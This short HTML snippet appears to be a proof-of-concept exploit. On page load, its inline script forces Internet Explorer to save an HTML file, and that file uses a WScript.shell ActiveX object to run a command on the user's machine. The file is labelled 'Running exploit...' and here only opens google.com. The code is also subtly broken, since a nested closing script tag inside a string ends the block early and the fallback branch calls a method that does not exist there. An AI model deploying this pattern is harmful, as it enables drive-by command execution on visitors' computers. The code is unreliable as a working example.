<script>
function downloadFileIE(data, fileName, mimeType) {
    const blob = new Blob([data], { type: mimeType });

    if (navigator.msSaveBlob) {
        // IE 10+ and Edge
        navigator.msSaveBlob(blob, fileName);
    } else {
        // For older versions of IE
        const blobObject = window.BlobBuilder || window.MozBlobBuilder || window.WebKitBlobBuilder || window.MSBlobBuilder;
        const bb = new blobObject();
        bb.append(data);
        const blob2 = bb.getBlob(mimeType);
        window.navigator.msSaveBlob(blob2, fileName);
    }
}

// Example usage
const fileData = "<script>var objShell = new ActiveXObject('WScript.shell');objShell.run('https://google.com');</script><h1>Running exploit...</h1>";
const fileName = 'ssfntest.html';
const mimeType = 'text/html';

downloadFileIE(fileData, fileName, mimeType);
 </script>
